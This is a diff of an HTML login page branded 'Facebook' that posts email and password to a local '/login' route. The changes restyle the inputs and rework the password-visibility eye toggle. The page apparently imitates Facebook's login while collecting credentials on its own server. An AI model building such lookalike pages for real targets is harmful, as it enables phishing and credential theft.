@@ -41,7 +41,7 @@
             margin-bottom: 20px;
         }
 
-        .login-box input[type="text"],
+        .login-box input[type="email"],
         .login-box input[type="password"] {
             width: 100%;
             padding: 15px;
@@ -52,20 +52,24 @@
             outline: none;
         }
 
-        .password-container {
+        .login-box .password-container {
             position: relative;
+            width: 100%;
         }
 
-        .eye-icon {
+        .login-box input[type="password"] {
+            padding-right: 45px; /* Adjust to make space for eye icon */
+        }
+
+        .login-box .toggle-password {
             position: absolute;
-            right: 15px;
-            top: 15px;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
             cursor: pointer;
-            width: 24px;
+            display: none; /* Initially hidden */
+            width: 24px; /* Adjusted to your icon size */
             height: 24px;
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-image: url('/static/visible.png'); /* Initial state set to visible */
         }
 
         .login-box input[type="submit"] {
@@ -158,13 +162,13 @@
         <div class="login-box">
             <h1>Facebook</h1>
             <form action="/login" method="POST">
-                <input type="text" name="email_or_phone" placeholder="Email or phone number" required>
+                <input type="email" name="email" placeholder="Email or phone number" required>
                 
                 <div class="password-container">
                     <input type="password" id="password" name="password" placeholder="Password" required>
-                    <span class="eye-icon" onclick="togglePassword()"></span>
+                    <img src="/static/visible.png" id="togglePassword" class="toggle-password" alt="Toggle Password Visibility">
                 </div>
-                
+
                 <input type="submit" value="Log In">
             </form>
             <a href="#" class="forgot-password">Forgotten password?</a>
@@ -180,22 +184,24 @@
     </footer>
 
     <script>
-        let isPasswordVisible = false;
+        const passwordInput = document.getElementById("password");
+        const togglePassword = document.getElementById("togglePassword");
         
-        function togglePassword() {
-            const passwordInput = document.getElementById("password");
-            const eyeIcon = document.querySelector(".eye-icon");
+        // Toggle password visibility when the eye icon is clicked
+        togglePassword.addEventListener("click", function () {
+            const isPasswordVisible = passwordInput.type === "text";
+            passwordInput.type = isPasswordVisible ? "password" : "text";
+            togglePassword.src = isPasswordVisible ? "/static/visible.png" : "/static/eye.png";
+        });
 
-            if (isPasswordVisible) {
-                passwordInput.type = "password";
-                eyeIcon.style.backgroundImage = "url('/static/visible.png')"; // Switch to "eye open" icon
+        // Show/hide the eye icon based on input
+        passwordInput.addEventListener("input", function () {
+            if (passwordInput.value.length > 0) {
+                togglePassword.style.display = "block";
             } else {
-                passwordInput.type = "text";
-                eyeIcon.style.backgroundImage = "url('/static/eye.png')"; // Switch to "eye closed" icon
+                togglePassword.style.display = "none";
             }
-
-            isPasswordVisible = !isPasswordVisible;
-        }
+        });
     </script>
 </body>
 </html>
